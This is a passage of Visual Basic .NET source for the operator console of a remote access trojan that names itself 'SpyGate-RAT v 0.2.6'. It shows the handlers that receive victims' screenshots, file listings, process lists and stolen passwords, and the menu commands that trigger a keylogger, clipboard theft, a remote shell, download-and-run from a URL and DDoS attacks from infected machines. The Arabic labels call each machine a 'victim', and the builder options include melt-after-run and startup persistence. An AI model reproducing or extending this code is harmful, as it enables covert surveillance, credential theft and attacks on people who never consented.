                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            Else
                                itm.ImageIndex = 8
                            End If
                            fff.ListView1.Items.Add(itm)
                            i += 1

                        Next
                    End If

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Cap
                    f.F = Me
                    f.Sock = sock
                    f.Name = "!" & sock
                    f.Sz = New Size(A(1), A(2))
                    f.Show()
                Case "@" ' i recive image  
                    Dim F As Cap = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            F.Text = "Remote Desktop  " & "Size: " & siz(B.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                S.Send(sock, "@" & Yy & F.C1.SelectedIndex & Yy & F.C2.Text & Yy & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(B, "@" & Yy)(1)
                        F.PktToImage(BB)
                    End If
                Case "@@" ' i recive image  
                    Dim BB As Byte() = fx(B, "@@" & Yy)(1)
                Case "edittextfile"
                    If My.Application.OpenForms("Text_Editor" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim texter As New Text_Editor
                    texter.sock = sock
                    texter.Name = "Text_Editor" & sock
                    texter.Text = texter.Text & " " & A(1) & " " & S.IP(sock)
                    texter.pathoftext = A(1)
                    texter.TextBox1.Text = A(2)
                    texter.Show()
                Case "getpath"
                    Dim fff As Form5 = My.Application.OpenForms("|||" & sock)
                    fff.TextBox1.Text = A(1)
                    S.Send(sock, "FileManager" & Yy & A(1))
                Case "downloadedfile"
                    IO.File.WriteAllBytes(Application.StartupPath & "\Downloads\" & A(2), Convert.FromBase64String(A(1)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                Case "openshell"
                    If My.Application.OpenForms("openshell" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New RemoteShell
                    fm.sock = sock
                    fm.Name = "openshell" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.Show()
                Case "rs"
                    Dim sh As RemoteShell = My.Application.OpenForms("openshell" & sock)
                    'Dim ch As String = .ToString

                    'sh.RichTextBox1.Text =
                    sh.RichTextBox1.AppendText(DEB(A(1)) & vbNewLine)
                Case "rsc"
                    Dim sh As RemoteShell = My.Application.OpenForms("openshell" & sock)
                    sh.Close()
                Case "OpenPro"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    If My.Application.OpenForms("OpenPro" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New processmanage
                    f.sock = sock
                    f.Name = "OpenPro" & sock
                    f.Text = f.Text & " | " & A(1)
                    f.Show()

                Case "ProcessManager"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    Dim fProc As processmanage = My.Application.OpenForms("OpenPro" & sock)
                    fProc.Enabled = False
                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then
                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))
                            If xx(2) = "-" Then xx(2) = "System"
                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(FormatNumber(Math.Round(xx(3) / 1024), 0))
                            If xx(4) = "-" Then xx(4) = "With Windows"
                            itm.SubItems.Add(xx(4))
                            itm.ImageIndex = 0
                            fProc.PListView.Items.Add(itm)
                        End If
                    Next
                    fProc.PListView.FindItemWithText(A(2)).ForeColor = Color.Red
                    fProc.Enabled = True
                Case "ppww"
                    Dim f As Password = My.Application.OpenForms("++" & sock)
                    Dim aa As String() = Split(A(1), "|")

                    Try
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.ImageIndex = 0
                            f.ListView1.Items.Add(ii)
                            i += 5
                        Next

                    Catch ex As Exception
                    End Try
                Case "++"
                    If My.Application.OpenForms("++" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Password
                    fm.sock = sock
                    fm.Name = "++" & sock
                    fm.Text = "Password" & " - " & S.IP(sock)
                    fm.Show()
                    S.Send(sock, "ppww")

            End Select
        Catch ex As Exception
        End Try


        '  MsgBox(ex.Message)

    End Sub
#End Region

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Text = "SpyGate-RAT v 0.2.6 - Users Online [ x ]".Replace("x", L1.Items.Count)
    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel1.Click
        Form3.ShowDialog()
    End Sub

    Private Sub PortSettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PortSettingsToolStripMenuItem.Click
        Form2.ShowDialog()
    End Sub

    Private Sub JToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles JToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "|||") ' file manger
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "OpenPro")
        Next
    End Sub

    Private Sub RemoteShellToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteShellToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openshell")
        Next
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegeditToolStripMenuItem.Click
        Try

            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "openRG" & "|U|")
            Next
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub GetClipBoardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetClipBoardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "clipss")
        Next
    End Sub

    Private Sub InformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformationToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Timer1.Start()
            S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        pinger = pinger + 1
    End Sub
    Private Sub L1_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles L1.Click
        For Each x As ListViewItem In L1.SelectedItems
            L1.ContextMenuStrip = ContextMenuStrip1
        Next
    End Sub
    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        L1.ContextMenuStrip = ContextMenuStrip
        If CheckBox1.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "!!")
                End If
            Next
            PictureBox1.Image = Nothing
        End If
        For Each x As ListViewItem In L1.SelectedItems
            Timer2.Start()
            S.Send(x.ToolTipText, "infoDesk")
        Next
        ListView1.Items.Clear()
    End Sub

    Private Sub StartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartProcessToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "fun")
        Next
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openkl")
        Next
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "sendfile" & "|U|" & n.Name & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        Else

        End If
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromLinkToolStripMenuItem.Click
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "download" & "|U|" & a & "|U|" & aa)
        Next
    End Sub
    Private Sub OpenWebSiteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenWebSiteToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        If c = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "openurl" & "|U|" & c)
            Next
        End If
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "close")
        Next
    End Sub

    Private Sub SendToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SendToolStripMenuItem.Click
        Dim name As String = InputBox("New Host", "Host")
        Dim p As String = InputBox("Port", "Port")

        If name = "" And p = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "Host" & "|U|" & name & "|U|" & p)
            Next
        End If
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim name As String = InputBox("New Name", "Name", "Osama")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "Ren" & "|U|" & name)
            Next

        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "r1")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Dim dr As DialogResult = MessageBox.Show("Are you sure To want to Uninstall Server ?", "Uninstall", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
            If dr = DialogResult.Yes Then
                S.Send(x.ToolTipText, "Uninstall")
            End If
        Next
    End Sub

    Private Sub StartProcessToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles StartProcessToolStripMenuItem2.Click
        Dim name As String = InputBox("ProcessName", "Process Name")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems

                S.Send(x.ToolTipText, "newpr" & "|U|" & name)
            Next
        End If
    End Sub

    Private Sub CloseProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseProcessToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "closeprocess" & "|U|")
            Dim cls As New closeprocess
            cls.Name = "closeprocess" & sock
            cls.sock = sock
            cls.Text = "Close Process" & " - " & S.IP(x.ToolTipText)
            cls.Show()
        Next
    End Sub
    Public Shared Function ENB(ByRef s As String) As String
        Return Convert.ToBase64String(Encoding.UTF8.GetBytes(s))
    End Function
    Public Shared Function DEB(ByRef s As String) As String
        Dim str As String
        Dim num As Integer = 0
Label_0002:
        Try
            Dim bytes As Byte() = Convert.FromBase64String(s)
            str = Encoding.UTF8.GetString(bytes)
        Catch exception1 As Exception
            Dim exception As Exception = exception1
            num += 1
            If (num = 3) Then
                str = Nothing
            Else
                s = (s & "=")
                GoTo Label_0002
            End If
        End Try
        Return str
    End Function

    Private Sub ChatToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChatToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "chat")
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub GetPasswordsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles GetPasswordsToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "++")
        Next
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub CopyIPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyIPToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0 Then
                Clipboard.SetText(L1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch ex As Exception

        End Try
    End Sub
    Private Sub DDOSAttackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DDOSAttackToolStripMenuItem.Click
        Dim w As String = InputBox("The Web site", "DDOS ATTACK")
        Dim speed As String = InputBox("Attack Speed", "10000 Or 12000 Or 8000 Or 15000")
        If w = "" Then
            MsgBox("Error", MsgBoxStyle.Critical)
        Else

            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "att" & Yy & w & Yy & speed)
            Next
        End If
    End Sub
    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        End
    End Sub

    Private Sub EnglishToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnglishToolStripMenuItem.Click
        ToolStripStatusLabel2.Text = "Language : English"
        processmanage.RefreshToolStripMenuItem.Text = "Refresh"
        processmanage.SuspendToolStripMenuItem.Text = "Suspend"
        processmanage.KillProcessToolStripMenuItem.Text = "Kill Process"

        ToolStripStatusLabel2.Text = "Language : English"
        ColumnHeader1.Text = "Server ID"
        ColumnHeader2.Text = "IP"
        ColumnHeader3.Text = "PC / User"
        ColumnHeader4.Text = "Country"
        ColumnHeader5.Text = "Acitve Windows"
        ColumnHeader7.Text = "Anti Virus"
        ColumnHeader8.Text = "CAM"
        ColumnHeader9.Text = "RAM"
        ColumnHeader6.Text = "OS"
        ColumnHeader11.Text = "CPU"
        ColumnHeader12.Text = "Ver"
        ColumnHeader13.Text = "Install Date"
        ToolStripStatusLabel1.Text = "Builder"
        ToolStripStatusLabel2.Text = "Language : English"
        ToolStripDropDownButton1.Text = "Settings"
        ColumnHeader10.Text = "Information"
        TabPage1.Text = "Screen"

        RunFileToolStripMenuItem.Text = "Run File"
        ControlPanelToolStripMenuItem.Text = "Control Panel"
        JToolStripMenuItem.Text = "File Manager"
        RemoteDesktopToolStripMenuItem.Text = "Remote Desktop"
        RemoteShellToolStripMenuItem.Text = "Remote Shell"
        ProcessManagerToolStripMenuItem.Text = "Process Manager"
        ExtrasToolStripMenuItem.Text = "Extras"
        ChatToolStripMenuItem.Text = "Open Chat"
        KeyloggerToolStripMenuItem.Text = "Keylogger"
        DDOSAttackToolStripMenuItem.Text = "DDOS Attack"
        InformationToolStripMenuItem.Text = "Information"
        CopyIPToolStripMenuItem.Text = "Copy IP"
        OpenWebSiteToolStripMenuItem.Text = "Open WebSite"
        RegeditToolStripMenuItem.Text = "Regedit"
        GetPasswordsToolStripMenuItem1.Text = "Get Passwords"
        GetClipBoardToolStripMenuItem.Text = "Get ClipBoard"
        StartProcessToolStripMenuItem.Text = "Fun"
        StartProcessToolStripMenuItem1.Text = "Process"
        StartProcessToolStripMenuItem2.Text = "Start Process"
        CloseProcessToolStripMenuItem.Text = "Close Process"
        ServerToolStripMenuItem.Text = "Server"
        CloseToolStripMenuItem.Text = "Close"
        RestartToolStripMenuItem.Text = "Restart"
        UninstallToolStripMenuItem.Text = "Uninstall"
        SendToolStripMenuItem.Text = "Send"
        RenameToolStripMenuItem.Text = "Rename"

        AboutToolStripMenuItem.Text = "About"
        LanguageToolStripMenuItem.Text = "Language"
        PortSettingsToolStripMenuItem.Text = "Port Settings"
        ArabicToolStripMenuItem.Text = "Arabic"
        EnglishToolStripMenuItem.Text = "English"

        Form2.Text = "Port Settings"
        Form2.Button4.Text = "Start"
        Form2.Button2.Text = "Stop"
        Form2.Button5.Text = "Save"
        Form2.Button1.Text = "OK"
        Form3.Text = "Create Server"
        Form3.GroupBox4.Text = "Contact Settings"
        Form3.GroupBox1.Text = "Connection Password"
        Form2.CheckBox4.Text = "Show Password"
        Form3.GroupBox2.Text = "Icon"
        Form3.GroupBox12.Text = "Install Server"
        Form3.Label1.Text = "DNS Address :"
        Form3.Label2.Text = "Port :"
        Form3.Label5.Text = "ID :"
        Form3.CheckBox4.Text = "Show Password"
        Form3.Button1.Text = "Select Icon"
        Form3.Button2.Text = "Build Server"
        Form3.melt.Text = "Melt After Run"
        Form3.CheckBox2.Text = "Copy To Folder Startup"
    End Sub

    Private Sub ArabicToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ArabicToolStripMenuItem.Click
        processmanage.RefreshToolStripMenuItem.Text = "تحديث"
        processmanage.SuspendToolStripMenuItem.Text = "تعليق العملية"
        processmanage.KillProcessToolStripMenuItem.Text = "قتل العملية"

        ToolStripStatusLabel2.Text = "اللغة : العربية"
        ColumnHeader1.Text = "إسم الضحية"
        ColumnHeader2.Text = "رقم الآيبي"
        ColumnHeader3.Text = "الجهاز / المستخدم"
        ColumnHeader4.Text = "الدولة"
        ColumnHeader5.Text = "النافذة النشطة"
        ColumnHeader7.Text = "الحماية"
        ColumnHeader8.Text = "الكـام"
        ColumnHeader9.Text = "الرام"
        ColumnHeader6.Text = "النظام"
        ColumnHeader11.Text = "المعالج"
        ColumnHeader12.Text = "النسخة"
        ColumnHeader13.Text = "تاريخ التسجيل"
        ToolStripStatusLabel1.Text = "تكوين السيرفر"
        ToolStripStatusLabel2.Text = "اللغة : العربية"
        ToolStripDropDownButton1.Text = "الإعدادات"
        ColumnHeader10.Text = "المعلومات"
        TabPage1.Text = "الشاشة"

        RunFileToolStripMenuItem.Text = "تشغيل ملف"
        ControlPanelToolStripMenuItem.Text = "لوحة التحكم"
        JToolStripMenuItem.Text = "إدارة الملفات"
        RemoteDesktopToolStripMenuItem.Text = "التحكم في سطح المكتب"
        RemoteShellToolStripMenuItem.Text = "موجه الأوامر"
        ProcessManagerToolStripMenuItem.Text = "مدير العمليات"
        ExtrasToolStripMenuItem.Text = "الإضافات"
        ChatToolStripMenuItem.Text = "فتح الدردشة"
        KeyloggerToolStripMenuItem.Text = "الكيلوغر"
        DDOSAttackToolStripMenuItem.Text = "الهجوم بالدوس"
        InformationToolStripMenuItem.Text = "المعلومات"
        CopyIPToolStripMenuItem.Text = "نسخ الآيبي"
        OpenWebSiteToolStripMenuItem.Text = "فتح موقع الويب"
        RegeditToolStripMenuItem.Text = "الريجستري"
        GetPasswordsToolStripMenuItem1.Text = "جلب الباسوردات"
        GetClipBoardToolStripMenuItem.Text = "الحصول على الحافظة"
        StartProcessToolStripMenuItem.Text = "المرح"
        StartProcessToolStripMenuItem1.Text = "العملية"
        StartProcessToolStripMenuItem2.Text = "بدأ العملية"
        CloseProcessToolStripMenuItem.Text = "إغلاق العملية"
        ServerToolStripMenuItem.Text = "السيرفر"
        CloseToolStripMenuItem.Text = "إغلاق السيرفر"
        RestartToolStripMenuItem.Text = "إعادة تشغيل السيرفر"
        UninstallToolStripMenuItem.Text = "إزالة السيرفر"
        SendToolStripMenuItem.Text = "إرسال السيرفر"
        RenameToolStripMenuItem.Text = "إعادة تسمية السيرفر"

        AboutToolStripMenuItem.Text = "الحقوق"
        LanguageToolStripMenuItem.Text = "اللغة"
        PortSettingsToolStripMenuItem.Text = "إعدادات البورت"
        ArabicToolStripMenuItem.Text = "العربية"
        EnglishToolStripMenuItem.Text = "الإنجليزية"

        Form2.Text = "إعدادات البورت"
        Form2.Button4.Text = "بدء"
        Form2.Button2.Text = "إيقاف"
        Form2.Button5.Text = "حفظ"
        Form2.Button1.Text = "موافق"
        Form3.Text = "إنشاء سيرفر"
        Form3.GroupBox4.Text = "إعدادات الإتصال"
        Form3.GroupBox1.Text = "كلمة مرور إتصال السيرفر"
        Form2.CheckBox4.Text = "إظهار الباسورد"
        Form3.GroupBox2.Text = "الأيقونة"
        Form3.GroupBox12.Text = "تثبيت السيرفر"
        Form3.Label1.Text = "النو ايبي :"
        Form3.Label2.Text = "البورت :"
        Form3.Label5.Text = "إسم الضحية :"
        Form3.CheckBox4.Text = "إظهار الباسورد :"
        Form3.Button1.Text = "إختيار الأيقونة"
        Form3.Button2.Text = "تكوين السيرفر"
        Form3.melt.Text = "إذابة السيرفر"
        Form3.CheckBox2.Text = "النسخ إلى حافظة الستاراب"
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        Form4.ShowDialog()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        ProgressBar1.Increment(50)
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            Timer3.Stop()
            Form2.ShowDialog()
        End If
    End Sub
End Class
